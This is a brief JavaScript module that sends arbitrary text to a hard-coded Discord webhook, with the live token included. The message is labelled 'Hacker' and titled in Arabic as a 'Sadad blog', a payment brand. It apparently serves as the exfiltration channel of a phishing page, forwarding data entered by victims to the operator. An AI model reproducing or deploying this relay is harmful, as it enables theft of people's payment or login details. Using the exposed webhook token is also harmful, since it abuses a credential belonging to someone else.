import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1323249719123775498/2tHPXziIZuO9lQz97O1n9FOhjryFjZrvhShp1ttt78-ppPXJF0DeJVTaFx7Y2YclN_Zg",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
